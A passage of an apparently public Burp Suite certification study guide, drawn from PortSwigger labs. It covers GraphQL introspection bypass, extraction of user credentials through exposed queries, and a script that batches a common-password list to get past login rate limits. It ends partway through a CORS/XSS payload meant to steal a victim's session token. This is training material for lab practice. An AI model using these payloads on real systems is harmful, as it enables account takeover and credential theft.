D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A\"\u003e\u003cpre\u003e/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-api-introspection-query.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-api-introspection-query.png\" alt=\"graphql-api-introspection-query.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBypass introspection protection matching the \u003cstrong\u003eregex\u003c/strong\u003e filters, and modify the query to include a \u003ccode\u003e%0a\u003c/code\u003e newline character after \u003ccode\u003e__schema\u003c/code\u003e and resend.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSave the introspection response to file as \u003ccode\u003egraphql.json\u003c/code\u003e, and remove HTTP headers from the saved response file leaving only body.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the InQL Scanner tab, load the file \u003ccode\u003egraphql.json\u003c/code\u003e and enter to scan API endpoint.\u003cbr\u003e\nExpand scan results for the schema and find the \u003ccode\u003egetUser\u003c/code\u003e query.\u003cbr\u003e\nIn Repeater, copy and paste the getUser query as parameter and send it to the API endpoint discovered but first URL encode all characters.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTest alternative user IDs until the API confirms \u003ccode\u003ecarlos\u003c/code\u003e user ID as 3.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-api-getuser-sensitivedata.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-api-getuser-sensitivedata.png\" alt=\"graphql-api-getuser-sensitivedata.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis give you sensitive information for a user on the system such as login token, login password information, etc.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint\" rel=\"nofollow\"\u003ePortSwigger Lab: Finding a hidden GraphQL endpoint\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eGraphQL Reveal Creds\u003c/h3\u003e\u003ca id=\"user-content-graphql-reveal-creds\" class=\"anchor\" aria-label=\"Permalink: GraphQL Reveal Creds\" href=\"#graphql-reveal-creds\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIntercept the login POST request to the target. \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the GraphQL mutation contain the username and password.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-identify.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-identify.png\" alt=\"graphql-identify\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCopy the URL of the \u003ccode\u003e/graphql/v1\u003c/code\u003e POST request and past into the \u003cem\u003e\u003cstrong\u003eInQL Scanner\u003c/strong\u003e\u003c/em\u003e tab to scan API.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-scanner.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-scanner.png\" alt=\"graphql-scanner.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThere is a getUser query that returns a user's username and password. This query fetches the relevant user information via a direct reference to an id number.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eModify a request by replacing the inQL tab query value to the below discovered \u003ccode\u003egetuser\u003c/code\u003e query from scanner.\u003cbr\u003e\nIn the POST JSON body remove the \u003ccode\u003eoperationName\u003c/code\u003e property and value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-modify-request.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-modify-request.png\" alt=\"graphql-modify-request.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eLog in to the site as the administrator, and gain access to the Admin panel.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure\" rel=\"nofollow\"\u003ePortSwigger Lab: Accidental exposure of private GraphQL fields\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eGraphQL Brute Force\u003c/h3\u003e\u003ca id=\"user-content-graphql-brute-force\" class=\"anchor\" aria-label=\"Permalink: GraphQL Brute Force\" href=\"#graphql-brute-force\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe login API is protected by rate limiter to protect against brute force attacks.\u003cbr\u003e\nSending too many incorrect login attempts to the API, rate limit protection response message response is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-graphql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{  \u0026quot;errors\u0026quot;: [\n    {\n      \u0026quot;path\u0026quot;: [\n        \u0026quot;login\u0026quot;\n      ],\n      \u0026quot;extensions\u0026quot;: {\n        \u0026quot;message\u0026quot;: \u0026quot;You have made too many incorrect login attempts. Please try again in 1 minute(s).\u0026quot;\n      },\n      \u0026quot;locations\u0026quot;: [\n        {\n          \u0026quot;line\u0026quot;: 3,\n          \u0026quot;column\u0026quot;: 9\n        }\n      ],\n      \u0026quot;message\u0026quot;: \u0026quot;Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s).\u0026quot;\n    }\n  ],\n  \u0026quot;data\u0026quot;: {\n    \u0026quot;login\u0026quot;: null\n  } }\"\u003e\u003cpre\u003e{  \u003cspan class=\"pl-c\"\u003e\"errors\"\u003c/span\u003e: [\n    {\n      \u003cspan class=\"pl-c\"\u003e\"path\"\u003c/span\u003e: [\n        \u003cspan class=\"pl-c\"\u003e\"login\"\u003c/span\u003e\n      ],\n      \u003cspan class=\"pl-c\"\u003e\"extensions\"\u003c/span\u003e: {\n        \u003cspan class=\"pl-c\"\u003e\"message\"\u003c/span\u003e: \u003cspan class=\"pl-c\"\u003e\"You have made too many incorrect login attempts. Please try again in 1 minute(s).\"\u003c/span\u003e\n      },\n      \u003cspan class=\"pl-c\"\u003e\"locations\"\u003c/span\u003e: [\n        {\n          \u003cspan class=\"pl-c\"\u003e\"line\"\u003c/span\u003e: 3,\n          \u003cspan class=\"pl-c\"\u003e\"column\"\u003c/span\u003e: 9\n        }\n      ],\n      \u003cspan class=\"pl-c\"\u003e\"message\"\u003c/span\u003e: \u003cspan class=\"pl-c\"\u003e\"Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s).\"\u003c/span\u003e\n    }\n  ],\n  \u003cspan class=\"pl-c\"\u003e\"data\"\u003c/span\u003e: {\n    \u003cspan class=\"pl-c\"\u003e\"login\"\u003c/span\u003e: \u003cspan class=\"pl-v\"\u003enull\u003c/span\u003e\n  } }\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing the following PortSwigger JavaScript to generate a list of login combination with \u003ca href=\"https://portswigger.net/web-security/authentication/auth-lab-passwords\" rel=\"nofollow\"\u003epassword wordlist\u003c/a\u003e as part of brute force attack that bypass rate limiting protection.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=\u0026gt;`\nbruteforce$index:login(input:{password: \u0026quot;$password\u0026quot;, username: \u0026quot;carlos\u0026quot;}) {\n        token\n        success\n    }\n`.replaceAll('$index',index).replaceAll('$password',element)).join('\\n'));console.log(\u0026quot;The query has been copied to your clipboard.\u0026quot;);\"\u003e\u003cpre\u003e\u003cspan class=\"pl-en\"\u003ecopy\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esplit\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e','\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003emap\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eelement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eindex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e`\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003ebruteforce$index:login(input:{password: \"$password\", username: \"carlos\"}) {\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        token\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        success\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e    }\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e`\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ereplaceAll\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'$index'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eindex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ereplaceAll\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'$password'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eelement\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ejoin\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'\\n'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003econsole\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003elog\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"The query has been copied to your clipboard.\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-brute-list.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-brute-list.png\" alt=\"graphql-brute-list.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing the output from the above JavaScript, and place it in the InQL tab of the login POST request \u003ccode\u003ePOST /graphql/v1 HTTP/2\u003c/code\u003e, removing the \u003ccode\u003eoperationName\u003c/code\u003e POST body parameter and value, before sending single request containing all possible passwords in the GraphQL query.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-brute-force-InQL.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-brute-force-InQL.png\" alt=\"graphql-brute-force-InQL.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eResponse from the single POST request is one value marked \u003ccode\u003etrue\u003c/code\u003e and the client login token return in response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReplace the cookie in browser to impersonate Carlos user session.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass\" rel=\"nofollow\"\u003ePortSwigger Lab: Bypassing GraphQL brute force protections\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eGraphQL Voyager\u003c/h3\u003e\u003ca id=\"user-content-graphql-voyager\" class=\"anchor\" aria-label=\"Permalink: GraphQL Voyager\" href=\"#graphql-voyager\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing GraphQL Voyager to visually find attack paths, sensitive functions, types, objects and data.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRun Introspection query and copy response body to file \u003ccode\u003eintrospection.json\u003c/code\u003e\nHost local GraphQL Voyager on Kali Linux:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"mkdir graphql-voyager-local\ncp ../introspection.json graphql-voyager-local/\nsudo apt install nodejs npm\nnpm install express graphql-voyager\nnode server.js\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003emkdir graphql-voyager-local\ncp ../introspection.json graphql-voyager-local/\nsudo apt install nodejs npm\nnpm install express graphql-voyager\nnode server.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSee code for the server.js in repo files.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBrowse to GraphQL voyager instance \u003ccode\u003ehttp://localhost:3001/voyager\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql.png\" alt=\"GraphQL Voyager\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCORS\u003c/h2\u003e\u003ca id=\"user-content-cors\" class=\"anchor\" aria-label=\"Permalink: CORS\" href=\"#cors\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#trusted-insecure-protocols\"\u003eTrusted insecure protocols\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#null-origin-trusted\"\u003eNull origin trusted\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eTrusted insecure protocols\u003c/h3\u003e\u003ca id=\"user-content-trusted-insecure-protocols\" class=\"anchor\" aria-label=\"Permalink: Trusted insecure protocols\" href=\"#trusted-insecure-protocols\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e in the \u003ccode\u003esource code\u003c/code\u003e the account details are requested with AJAX request and it contains the user session cookie in the response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cors-ajax-request.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cors-ajax-request.png\" alt=\"cors-ajax-request.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTest if the application CORS configuration will allow access to sub-domains using below test header. If response include the \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e header with the origin reflect it is vulnerable to \u003cstrong\u003eCORS\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Origin: http://subdomain.TARGET.NET\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eOrigin: http://subdomain.TARGET.NET\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe target call subdomain to retrieve stock values, and the \u003ccode\u003eproductid\u003c/code\u003e parameter is vulnerable to cross-site scripting (XSS).\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/subdomain-cors-xss.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/subdomain-cors-xss.png\" alt=\"Subdomain cors xss\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePlace code in the exploit server body and \u003cstrong\u003eDeliver exploit to victim\u003c/strong\u003e to steal the AJAX session token and API key. In the BSCP exam use the \u003ca href=\"#cors\"\u003eCORS\u003c/a\u003e vulnerability to steal JSON data that also include the administrator session token, and can be used to escalate privilege.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n    document.location=\u0026quot;http://stock.TARGET.net/?productId=4\u0026lt;script\u0026gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); 